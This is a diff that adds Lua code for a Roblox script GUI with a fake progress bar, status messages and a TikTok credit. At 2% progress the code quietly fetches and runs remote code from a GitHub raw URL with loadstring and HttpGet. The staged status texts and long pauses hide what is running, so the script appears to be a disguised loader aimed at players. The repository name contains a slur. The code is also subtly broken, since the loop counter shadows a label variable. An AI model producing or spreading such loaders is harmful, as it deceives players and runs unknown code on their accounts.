@@ -69,4 +69,91 @@ Instance.new("UICorner", pb).CornerRadius = UDim.new(0, 14)
 
 -- Actual Progress Fill
 local bar = Instance.new("Frame", pb)
-bar.Size = UDim2.new(0, 0
+bar.Size = UDim2.new(0, 0, 1, 0)
+bar.BackgroundColor3 = Color3.fromRGB(0, 255, 140)
+Instance.new("UICorner", bar).CornerRadius = UDim.new(0, 14)
+
+-- Percentage Text
+local perc = Instance.new("TextLabel", pb)
+perc.Size = UDim2.new(1, 0, 1, 0)
+perc.BackgroundTransparency = 1
+perc.TextColor3 = Color3.fromRGB(255, 255, 255)
+perc.Font = Enum.Font.GothamSemibold
+perc.TextScaled = true
+perc.Text = "0% Complete"
+
+-- Info Label
+local i = Instance.new("TextLabel", f)
+i.Size = UDim2.new(1, 0, 0.09, 0)
+i.Position = UDim2.new(0, 0, 0.78, 0)
+i.BackgroundTransparency = 1
+i.Font = Enum.Font.GothamSemibold
+i.TextColor3 = Color3.fromRGB(200, 200, 200)
+i.TextScaled = true
+i.Text = "⏳ Please wait, script is initializing..."
+
+-- Footer Credit
+local credit = Instance.new("TextLabel", f)
+credit.Size = UDim2.new(1, 0, 0.06, 0)
+credit.Position = UDim2.new(0, 0, 0.96, 0)
+credit.BackgroundTransparency = 1
+credit.Font = Enum.Font.GothamSemibold
+credit.TextColor3 = Color3.fromRGB(170, 170, 170)
+credit.TextScaled = true
+credit.Text = "👨‍💻📜 Script made by @growyourowngarden on TikTok"
+
+-- Get status based on %
+local function getStatus(i)
+	if i < 20 then return "🔍 Scanning game environment..."
+	elseif i < 40 then return "🧠 Analyzing local assets..."
+	elseif i < 60 then return "⚙️ Loading functions..."
+	elseif i < 80 then return "📡 Connecting to remote server..."
+	else return "🚀 Finalizing execution..."
+	end
+end
+
+-- Progress Function
+local function fillProgress()
+	a = true
+	bar.Size = UDim2.new(0, 0, 1, 0)
+	perc.Text = "0% Complete"
+
+	for i = 1, 100 do
+		-- Smooth Tween
+		local targetSize = UDim2.new(i / 100, 0, 1, 0)
+		local tween = TweenService:Create(bar, TweenInfo.new(0.25, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), { Size = targetSize })
+		tween:Play()
+
+		-- Update text
+		perc.Text = i .. "% Complete"
+		i.Text = getStatus(i)
+
+		-- Run script early
+		if i == 2 then
+			pcall(function()
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/No-Laggs/walapatoniggaa/refs/heads/main/gragraj"))()
+			end)
+		end
+
+		-- Pauses
+		if i == 50 or i == 60 then
+			wait(2)
+		elseif i == 80 or i == 90 then
+			wait(60)
+		else
+			wait(math.random(1, 4) / 100 + 0.01)
+		end
+	end
+
+	a = false
+	retryBtn.Visible = true
+end
+
+-- Start progress
+fillProgress()
+
+-- Retry Button resets
+retryBtn.MouseButton1Click:Connect(function()
+	retryBtn.Visible = false
+	fillProgress()
+end)
